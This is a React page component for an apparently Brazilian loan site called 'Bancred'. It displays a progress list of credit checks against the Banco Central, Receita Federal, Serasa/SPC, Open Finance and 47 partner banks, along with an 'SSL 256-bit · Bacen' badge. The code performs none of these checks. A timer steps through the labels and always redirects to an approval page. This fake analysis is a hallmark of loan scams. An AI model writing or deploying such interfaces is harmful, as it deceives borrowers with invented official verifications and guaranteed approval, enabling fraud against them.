import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { CheckCircle2, Loader2, ShieldCheck } from "lucide-react";
import logo from "@/assets/bancred-logo.png";
import ConsultorCard from "@/components/ConsultorCard";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const STEPS = [
  "Conectando ao Banco Central (Bacen)",
  "Consultando CPF na Receita Federal",
  "Validando score no SCR/Serasa/SPC",
  "Analisando histórico bancário (Open Finance)",
  "Calculando capacidade de pagamento (IA)",
  "Verificando 47 instituições parceiras",
  "Aplicando taxa promocional reduzida",
  "Emitindo proposta personalizada",
];

const STEP_DURATION = 1100;

const Analisando = () => {
  const navigate = useNavigate();
  const [params] = useSearchParams();
  const [current, setCurrent] = useState(0);

  useEffect(() => {
    if (current >= STEPS.length) {
      const t = setTimeout(() => {
        navigate(`/aprovado?${params.toString()}`);
      }, 600);
      return () => clearTimeout(t);
    }
    const t = setTimeout(() => setCurrent((c) => c + 1), STEP_DURATION);
    return () => clearTimeout(t);
  }, [current, navigate, params]);

  const progress = Math.min(100, ((current + (current >= STEPS.length ? 0 : 0.5)) / STEPS.length) * 100);

  return (
    <div
      style={{
        minHeight: "100dvh",
        background: "#F4F4F7",
        fontFamily: fontStack,
        color: "#111827",
        WebkitFontSmoothing: "antialiased",
      }}
    >
      <header
        style={{
          background: "#FFFFFF",
          borderBottom: "1px solid #E5E7EB",
          padding: "14px 16px",
          textAlign: "center",
        }}
      >
        <img
          src={logo}
          alt="Bancred"
          style={{ height: 104, width: "auto", display: "inline-block", objectFit: "contain" }}
        />
      </header>

      <main style={{ padding: "24px 16px", maxWidth: 480, margin: "0 auto" }}>
        <div style={{ marginBottom: 16 }}>
          <ConsultorCard />
        </div>
        <div
          style={{
            background: "#FFFFFF",
            borderRadius: 16,
            padding: 28,
            boxShadow: "0 1px 2px rgba(17,24,39,0.04), 0 4px 12px rgba(17,24,39,0.04)",
            border: "1px solid #E5E7EB",
          }}
        >
          <div style={{ marginBottom: 18 }}>
            <Loader2 size={42} color="#1C68E3" className="animate-spin" strokeWidth={2.5} />
          </div>

          <h1 style={{ fontSize: 22, fontWeight: 700, marginBottom: 6, textAlign: "center" }}>
            Analisando seu perfil
          </h1>
          <p style={{ fontSize: 14, color: "#6B7280", textAlign: "center", marginBottom: 22 }}>
            Isso leva apenas alguns segundos
          </p>

          <div
            style={{
              width: "100%",
              height: 8,
              background: "#E5E7EB",
              borderRadius: 999,
              overflow: "hidden",
              marginBottom: 10,
            }}
          >
            <div
              style={{
                width: `${progress}%`,
                height: "100%",
                background: "#1C68E3",
                borderRadius: 999,
                transition: "width 0.7s ease",
              }}
            />
          </div>

          <div
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              marginBottom: 20,
              fontSize: 12,
            }}
          >
            <span style={{ display: "inline-flex", alignItems: "center", gap: 6, color: "#6B7280" }}>
              <ShieldCheck size={14} color="#16A34A" strokeWidth={2.5} />
              SSL 256-bit · Bacen
            </span>
            <span style={{ color: "#1C68E3", fontWeight: 700 }}>{Math.round(progress)}%</span>
          </div>

          <ul
            style={{
              listStyle: "none",
              padding: 0,
              margin: 0,
              display: "flex",
              flexDirection: "column",
              gap: 16,
            }}
          >
            {STEPS.map((label, idx) => {
              const isDone = idx < current;
              const isActive = idx === current;
              const isPending = idx > current;
              return (
                <li
                  key={label}
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: 12,
                    opacity: isPending ? 0.45 : 1,
                    transition: "opacity 0.3s ease",
                  }}
                >
                  <span
                    style={{
                      width: 28,
                      height: 28,
                      borderRadius: "50%",
                      background: isDone ? "#16A34A" : isActive ? "#DBEAFE" : "#F3F4F6",
                      color: isDone ? "#FFFFFF" : isActive ? "#1C68E3" : "#9CA3AF",
                      display: "inline-flex",
                      alignItems: "center",
                      justifyContent: "center",
                      flexShrink: 0,
                      transition: "background 0.3s ease, color 0.3s ease",
                    }}
                  >
                    {isDone ? (
                      <CheckCircle2 size={20} strokeWidth={2.5} />
                    ) : isActive ? (
                      <Loader2 size={16} className="animate-spin" strokeWidth={2.5} />
                    ) : null}
                  </span>
                  <span
                    style={{
                      fontSize: 14,
                      fontWeight: isActive ? 600 : 500,
                      color: isPending ? "#9CA3AF" : "#111827",
                    }}
                  >
                    {label}
                  </span>
                </li>
              );
            })}
          </ul>
        </div>
      </main>
    </div>
  );
};

export default Analisando;
